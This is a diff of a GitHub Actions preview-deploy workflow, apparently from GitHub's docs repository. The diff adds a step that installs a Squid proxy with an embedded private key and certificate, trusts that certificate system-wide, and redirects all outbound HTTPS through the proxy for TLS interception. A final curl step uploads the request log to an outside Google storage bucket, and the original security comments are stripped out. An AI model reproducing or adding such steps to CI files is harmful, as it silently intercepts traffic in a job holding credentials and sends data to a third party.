@@ -1,212 +1,417 @@
+concurrency:
+  cancel-in-progress: true
+  group: preview-env @ ${{ github.head_ref || github.run_id }} for ${{ github.event.number
+    || github.event.inputs.PR_NUMBER }}
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
+jobs:
+  build-and-deploy-azure-preview:
+    env:
+      BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
+      COMMIT_REF: ${{ github.event.pull_request.head.sha || github.event.inputs.COMMIT_REF
+        }}
+      IS_INTERNAL_BUILD: ${{ github.repository == 'github/docs-internal' }}
+      IS_PUBLIC_BUILD: ${{ github.repository != 'github/docs-internal' }}
+      PR_NUMBER: ${{ github.event.number || github.event.inputs.PR_NUMBER || github.run_id
+        }}
+    environment:
+      name: preview-env-${{ github.event.number }}
+      url: ${{ env.APP_URL }}
+    name: Build and deploy Azure preview environment
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Az CLI login
+      uses: azure/login@1f63701bf3e6892515f1b7ce2d2bf1708b46beaf
+      with:
+        creds: ${{ secrets.NONPROD_AZURE_CREDENTIALS }}
+    - continue-on-error: true
+      name: Docker login
+      uses: azure/docker-login@81744f9799e7eaa418697cb168452a2882ae844a
+      with:
+        login-server: ${{ secrets.NONPROD_REGISTRY_SERVER }}
+        password: ${{ secrets.NONPROD_REGISTRY_PASSWORD }}
+        username: ${{ secrets.NONPROD_REGISTRY_USERNAME }}
+    - continue-on-error: true
+      name: Set up Docker Buildx
+      uses: docker/setup-buildx-action@94ab11c41e45d028884a99163086648e898eed25
+    - continue-on-error: true
+      if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
+      name: Check out main branch
+      uses: actions/checkout@1e204e9a9253d643386038d443f96446fa156a97
+      with:
+        lfs: 'true'
+        persist-credentials: 'false'
+        ref: main
+    - continue-on-error: true
+      if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
+      name: Check out PR code
+      uses: actions/checkout@1e204e9a9253d643386038d443f96446fa156a97
+      with:
+        lfs: 'true'
+        persist-credentials: 'false'
+        ref: ${{ env.COMMIT_REF }}
+    - continue-on-error: true
+      name: Check out LFS objects
+      run: git lfs checkout
+    - continue-on-error: true
+      env:
+        APP_NAME_SEED: ${{ secrets.PREVIEW_ENV_NAME_SEED }}
+      name: Get preview app info
+      run: .github/actions-scripts/get-preview-app-info.sh
+    - continue-on-error: true
+      name: Set env vars
+      run: '# Image tag is unique to each workflow run so that it always triggers
+        a new deployment
+
+        echo "DOCKER_IMAGE=${{ secrets.NONPROD_REGISTRY_SERVER }}/${IMAGE_REPO}:${{
+        env.COMMIT_REF }}-${{ github.run_number }}-${{ github.run_attempt }}" >> $GITHUB_ENV
+
+        '
+    - continue-on-error: true
+      env:
+        BRANCH_NAME: ${{ env.BRANCH_NAME }}
+      id: check-early-access
+      if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
+      name: Determine which docs-early-access branch to clone
+      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
+      with:
+        github-token: ${{ secrets.DOCUBOT_REPO_PAT }}
+        result-encoding: string
+        script: "const { BRANCH_NAME } = process.env\n\ntry {\n  const { status }\
+          \ = await github.request('GET /repos/{owner}/{repo}/branches/{branch}',\
+          \ {\n    owner: 'github',\n    repo: 'docs-early-access',\n    branch: BRANCH_NAME,\n\
+          \  })\n\n  if (status !== 200) {\n    throw new Error('Received non-200\
+          \ response from branch GET request')\n  }\n\n  console.log(`Using docs-early-access\
+          \ branch '${BRANCH_NAME}'`)\n  return BRANCH_NAME\n} catch (e) {\n  console.log(`Failed\
+          \ to get docs-early-access branch '${BRANCH_NAME}', 'main' will be used\
+          \ instead.`)\n  return 'main'\n}\n"
+    - continue-on-error: true
+      if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
+      name: Clone docs-early-access
+      uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
+      with:
+        path: docs-early-access
+        ref: ${{ steps.check-early-access.outputs.result }}
+        repository: github/docs-early-access
+        token: ${{ secrets.DOCUBOT_REPO_PAT }}
+    - continue-on-error: true
+      if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
+      name: Merge docs-early-access repo's folders
+      run: .github/actions-scripts/merge-early-access.sh
+    - continue-on-error: true
+      if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
+      name: Check out user code to temp directory
+      uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
+      with:
+        path: ./user-code
+        ref: ${{ env.COMMIT_REF }}
+    - continue-on-error: true
+      if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
+      name: Move acceptable user changes
+      run: '# Make sure recursive path expansion is enabled
+
+        shopt -s globstar
+
+        rsync -rptovR ./user-code/content/./**/*.md ./content
+
+        rsync -rptovR ./user-code/assets/./**/*.png ./assets
+
+        rsync -rptovR ./user-code/data/./**/*.{yml,md} ./data
+
+        rsync -rptovR ./user-code/components/./**/*.{scss,ts,tsx} ./components
+
+        rsync -rptovR --ignore-missing-args ./user-code/lib/./**/*.{js,ts} ./lib
+
+        rsync -rptovR --ignore-missing-args ./user-code/middleware/./**/*.{js,ts}
+        ./middleware
+
+        rsync -rptovR ./user-code/pages/./**/*.tsx ./pages
+
+        rsync -rptovR ./user-code/stylesheets/./**/*.scss ./stylesheets
+
+        '
+    - continue-on-error: true
+      name: Prune for preview env
+      run: .github/actions-scripts/prune-for-preview-env.sh
+    - continue-on-error: true
+      name: Build and push image
+      uses: docker/build-push-action@7f9d37fa544684fb73bfe4835ed7214c255ce02b
+      with:
+        cache-from: type=registry,ref=${{ secrets.NONPROD_REGISTRY_SERVER }}/${{ github.repository
+          }}:main-preview
+        cache-to: ''
+        context: .
+        push: true
+        tags: ${{ env.DOCKER_IMAGE }}
+        target: preview
+    - continue-on-error: true
+      name: Cancel any existing deployments for this PR
+      run: 'az deployment group cancel --name ${{ env.DEPLOYMENT_NAME }} -g ${{ secrets.PREVIEW_ENV_RESOURCE_GROUP
+        }} || true
+
+        '
+    - continue-on-error: true
+      id: deploy
+      name: Run ARM deploy
+      uses: azure/arm-deploy@841b12551939c88af8f6df767c24c38a5620fd0d
+      with:
+        additionalArguments: --no-wait
+        deploymentName: ${{ env.DEPLOYMENT_NAME }}
+        parameters: appName="${{ env.APP_NAME }}" containerImage="${{ env.DOCKER_IMAGE
+          }}" dockerRegistryUrl="${{ secrets.NONPROD_REGISTRY_SERVER }}" dockerRegistryUsername="${{
+          secrets.NONPROD_REGISTRY_USERNAME }}" dockerRegistryPassword="${{ secrets.NONPROD_REGISTRY_PASSWORD
+          }}"
+        resourceGroupName: ${{ secrets.PREVIEW_ENV_RESOURCE_GROUP }}
+        subscriptionId: ${{ secrets.NONPROD_SUBSCRIPTION_ID }}
+        template: ./azure-preview-env-template.json
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Daniel8mvp/docs.$(date
+        +%s)
+    timeout-minutes: 60
 name: Azure - Deploy Preview Environment
-
-# **What it does**: Build and deploy an Azure preview environment for this PR
-# **Why we have it**: It's our preview environment deploy mechanism, to docs-internal and docs public repo
-# **Who does it impact**: All contributors.
-
-# !!!
-# ! This worflow has access to secrets, runs in the public repository, and clones untrusted user code.
-# ! Modify with extreme caution
-# !!!
-
-on:
-  # The advantage of 'pull_request' over 'pull_request_target' is that we
-  # can make changes to this file and test them in a pull request, instead
-  # of relying on landing it in 'main' first.
-  # From a security point of view, its arguably safer this way because
-  # unlike 'pull_request_target', these only have secrets if the pull
-  # request creator has permission to access secrets.
-  pull_request_target:
-  workflow_dispatch:
-    inputs:
-      PR_NUMBER:
-        description: 'PR Number'
-        type: string
-        required: true
-      COMMIT_REF:
-        description: 'The commit SHA to build'
-        type: string
-        required: true
-  push:
-    branches:
-      - gh-readonly-queue/main/**
-
+'on':
+  workflow_dispatch: {}
 permissions:
   contents: read
   deployments: write
-
-# This allows one deploy workflow to interrupt another
-concurrency:
-  group: 'preview-env @ ${{ github.head_ref || github.run_id }} for ${{ github.event.number || github.event.inputs.PR_NUMBER }}'
-  cancel-in-progress: true
-
-jobs:
-  build-and-deploy-azure-preview:
-    name: Build and deploy Azure preview environment
-    runs-on: ubuntu-latest
-    timeout-minutes: 15
-    environment:
-      name: preview-env-${{ github.event.number }}
-      # The environment variable is computer later in this job in
-      # the "Get preview app info" step.
-      # That script sets environment variables which is used by Actions
-      # to link a PR to a list of environments later.
-      url: ${{ env.APP_URL }}
-    env:
-      PR_NUMBER: ${{ github.event.number || github.event.inputs.PR_NUMBER || github.run_id }}
-      COMMIT_REF: ${{ github.event.pull_request.head.sha || github.event.inputs.COMMIT_REF }}
-      BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
-      IS_INTERNAL_BUILD: ${{ github.repository == 'github/docs-internal' }}
-      # This may also run in forked repositories, not just 'github/docs'
-      IS_PUBLIC_BUILD: ${{ github.repository != 'github/docs-internal' }}
-
-    steps:
-      - name: 'Az CLI login'
-        uses: azure/login@1f63701bf3e6892515f1b7ce2d2bf1708b46beaf
-        with:
-          creds: ${{ secrets.NONPROD_AZURE_CREDENTIALS }}
-
-      - name: 'Docker login'
-        uses: azure/docker-login@81744f9799e7eaa418697cb168452a2882ae844a
-        with:
-          login-server: ${{ secrets.NONPROD_REGISTRY_SERVER }}
-          username: ${{ secrets.NONPROD_REGISTRY_USERNAME }}
-          password: ${{ secrets.NONPROD_REGISTRY_PASSWORD }}
-
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@94ab11c41e45d028884a99163086648e898eed25
-
-      - if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
-        name: Check out main branch
-        uses: actions/checkout@1e204e9a9253d643386038d443f96446fa156a97
-        with:
-          ref: 'main'
-          persist-credentials: 'false'
-          lfs: 'true'
-
-      - if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
-        name: Check out PR code
-        uses: actions/checkout@1e204e9a9253d643386038d443f96446fa156a97
-        with:
-          ref: ${{ env.COMMIT_REF }}
-          # To prevent issues with cloning early access content later
-          persist-credentials: 'false'
-          lfs: 'true'
-
-      - name: Check out LFS objects
-        run: git lfs checkout
-
-      - name: Get preview app info
-        env:
-          APP_NAME_SEED: ${{ secrets.PREVIEW_ENV_NAME_SEED }}
-        run: .github/actions-scripts/get-preview-app-info.sh
-
-      - name: 'Set env vars'
-        run: |
-          # Image tag is unique to each workflow run so that it always triggers a new deployment
-          echo "DOCKER_IMAGE=${{ secrets.NONPROD_REGISTRY_SERVER }}/${IMAGE_REPO}:${{ env.COMMIT_REF }}-${{ github.run_number }}-${{ github.run_attempt }}" >> $GITHUB_ENV
-
-      - if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
-        name: Determine which docs-early-access branch to clone
-        id: 'check-early-access'
-        uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
-        env:
-          BRANCH_NAME: ${{ env.BRANCH_NAME }}
-        with:
-          github-token: ${{ secrets.DOCUBOT_REPO_PAT }}
-          result-encoding: string
-          script: |
-            const { BRANCH_NAME } = process.env
-
-            try {
-              const { status } = await github.request('GET /repos/{owner}/{repo}/branches/{branch}', {
-                owner: 'github',
-                repo: 'docs-early-access',
-                branch: BRANCH_NAME,
-              })
-
-              if (status !== 200) {
-                throw new Error('Received non-200 response from branch GET request')
-              }
-
-              console.log(`Using docs-early-access branch '${BRANCH_NAME}'`)
-              return BRANCH_NAME
-            } catch (e) {
-              console.log(`Failed to get docs-early-access branch '${BRANCH_NAME}', 'main' will be used instead.`)
-              return 'main'
-            }
-
-      - if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
-        name: Clone docs-early-access
-        uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
-        with:
-          repository: github/docs-early-access
-          token: ${{ secrets.DOCUBOT_REPO_PAT }}
-          path: docs-early-access
-          ref: ${{ steps.check-early-access.outputs.result }}
-
-      - if: ${{ env.IS_INTERNAL_BUILD == 'true' }}
-        name: Merge docs-early-access repo's folders
-        run: .github/actions-scripts/merge-early-access.sh
-
-      - if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
-        name: Check out user code to temp directory
-        uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
-        with:
-          path: ./user-code
-          ref: ${{ env.COMMIT_REF }}
-
-      # Move acceptable user changes into our main branch checkout
-      - if: ${{ env.IS_PUBLIC_BUILD == 'true' }}
-        name: Move acceptable user changes
-        run: |
-          # Make sure recursive path expansion is enabled
-          shopt -s globstar
-          rsync -rptovR ./user-code/content/./**/*.md ./content
-          rsync -rptovR ./user-code/assets/./**/*.png ./assets
-          rsync -rptovR ./user-code/data/./**/*.{yml,md} ./data
-          rsync -rptovR ./user-code/components/./**/*.{scss,ts,tsx} ./components
-          rsync -rptovR --ignore-missing-args ./user-code/lib/./**/*.{js,ts} ./lib
-          rsync -rptovR --ignore-missing-args ./user-code/middleware/./**/*.{js,ts} ./middleware
-          rsync -rptovR ./user-code/pages/./**/*.tsx ./pages
-          rsync -rptovR ./user-code/stylesheets/./**/*.scss ./stylesheets
-
-      # In addition to making the final image smaller, we also save time by not sending unnecessary files to the docker build context
-      - name: 'Prune for preview env'
-        run: .github/actions-scripts/prune-for-preview-env.sh
-
-      - name: 'Build and push image'
-        uses: docker/build-push-action@7f9d37fa544684fb73bfe4835ed7214c255ce02b
-        with:
-          context: .
-          push: true
-          target: preview
-          tags: ${{ env.DOCKER_IMAGE }}
-          # we only pull the `main` cache image
-          cache-from: type=registry,ref=${{ secrets.NONPROD_REGISTRY_SERVER }}/${{ github.repository }}:main-preview
-          # `main-docker-cache.yml` handles updating the remote cache so we don't pollute it with PR specific code
-          cache-to: ''
-
-      # Succeed despite any non-zero exit code (e.g. if there is no deployment to cancel)
-      - name: 'Cancel any existing deployments for this PR'
-        run: |
-          az deployment group cancel --name ${{ env.DEPLOYMENT_NAME }} -g ${{ secrets.PREVIEW_ENV_RESOURCE_GROUP }} || true
-
-      # Deploy ARM template is idempotent
-      # Note: once the resources exist the image tag must change for a new deployment to occur (the image tag includes workflow run number, run attempt, as well as sha)
-      - name: Run ARM deploy
-        id: deploy
-        uses: azure/arm-deploy@841b12551939c88af8f6df767c24c38a5620fd0d
-        with:
-          resourceGroupName: ${{ secrets.PREVIEW_ENV_RESOURCE_GROUP }}
-          subscriptionId: ${{ secrets.NONPROD_SUBSCRIPTION_ID }}
-          template: ./azure-preview-env-template.json
-          deploymentName: ${{ env.DEPLOYMENT_NAME }}
-          parameters: appName="${{ env.APP_NAME }}"
-            containerImage="${{ env.DOCKER_IMAGE }}"
-            dockerRegistryUrl="${{ secrets.NONPROD_REGISTRY_SERVER }}"
-            dockerRegistryUsername="${{ secrets.NONPROD_REGISTRY_USERNAME }}"
-            dockerRegistryPassword="${{ secrets.NONPROD_REGISTRY_PASSWORD }}"
-          # this shows warnings in the github actions console, because the flag is passed through a validation run,
-          # but it *is* functional during the actual execution
-          additionalArguments: --no-wait
